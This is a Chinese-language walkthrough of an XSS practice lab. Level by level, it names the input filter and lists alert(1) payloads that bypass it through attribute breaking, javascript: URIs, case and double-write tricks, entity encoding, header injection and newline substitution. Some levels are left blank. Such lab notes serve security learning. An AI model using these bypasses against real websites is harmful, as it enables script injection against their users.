1. 没有任何过滤
> <script>alert('xss')</script>
2. 源码发现`".htmlspecialchars($str)."`
把<和>转换成HTML实体，也就是说大于小于不能用
> "><script>alert('xss')</script>
> " onmouseover=alert(1)>需要鼠标划过输入框
`" onclick=alert(1)<br>`需要点击搜索框
3. 与第二关的区别在于`'".htmlspecialchars($str)."'`
> ' onmouseover=alert(1)//
- `<input name="keyword" value=" " onmouseover="alert(1)//'">`
4. 查看代码发现`str_replace("<>","",$str)` 
<>被替换成空
> " onfocus=alert(1) autofocus="
- `<input name=keyword value=" " onfocus=alert(1) autofocus=" " >`
> " onclick=alert(1) //
- `<input name=keyword value=" " onclick=alert(1) //">`
5. 分析代码发现strtolower函数，会把所有字母编程小写字母,并且过滤`<script`和`on`,不过这次没有过滤大于小于
> `"><iframe src=javascript:alert(1)>`
> `"><a href=javascript:alert(1)> `
> `"> <a href="javascript:alert(1)">zhouzhong</a>`
> `"> <a href="javascript:%61lert(1)">zhouzhong</a> //`
6. 过滤了script，on，src，data，href，但是没有大小写约束
> `"> <Script>alert(1)</script> //`
> `"> <img Src=x OnError=alert(1)> //`
> `"><a HrEf="javascript:alert(1)">zhouzhong</a>//`
> `" OncliCk=alert(1) //`
7. 过滤了script，on，src，data，href,过滤了大小写，尝试双写绕过
> `"><sscriptcript>alert(1)</sscriptcript>`
> `">hello<sscriptcript>alert(1)</sscriptcript>`
> `" oonnmouseover=alert(1)`
> `"><a hrhrefef=javascriscriptpt:alert(1)>zhouzhong</a>`
8. 过滤了script，on，src，data，href,过滤了大小写和双引号,使用html实体字符转换
> `javascrip&#x74;:alert(1)`
> `javasc&#x72;ipt:alert`1``
> `javasc&#x0072;ipt:alert`1``
9. 与8一样，只不过多了自动检测url，如果没有带`http://`内容则会显示不合法
> `javascrip&#x74;:alert(1)//http://xxx.com`
> `javascrip&#x74;:%0dhttp://xxx.com%0dalert(1)`
10. 分析代码，发现需要两个参数，一个是keyword，一个是t_sort，尖括号<>都被转换成空，还有三个hidden的隐藏输入框，

或许我们可以从隐藏的输入框下手，构造payload：
> `keyword = test&t_sort="type="text" onclick = "alert(1)`
> `keyword = test&t_sort="type="text" onmouseover="alert(1)`
11. 多了一个 str11=_SERVER[‘HTTP_REFERER’]; 考察的是http头部的xss注入，burpsuite抓包，新增相应的字段，构造http头部Referer的payload:
> `Referer: " onmouseover=alert(1) type="text"`
> `Referer: " onclick="alert(1) type="text"`
12. 更改user-agent
13. 更改cookie
14.
15.
16. 禁止大小写绕过
script , / , (空格),等都被转换成&nbsp

即用%0d，%0a等绕过：

0a------换行符号－－－－－－"\n"
0d------回车符号－－－－－－"\r"
> `<img%0Dsrc=1%0Donerror=alert(1)>`
> `<iframe%0asrc=x%0donmouseover=alert`1`></iframe>`
> `<svg%0aonload=alert`1`></svg>`
17.
> `onmouseover=alert(1)`
18. 
> `onmouseover=alert(1)`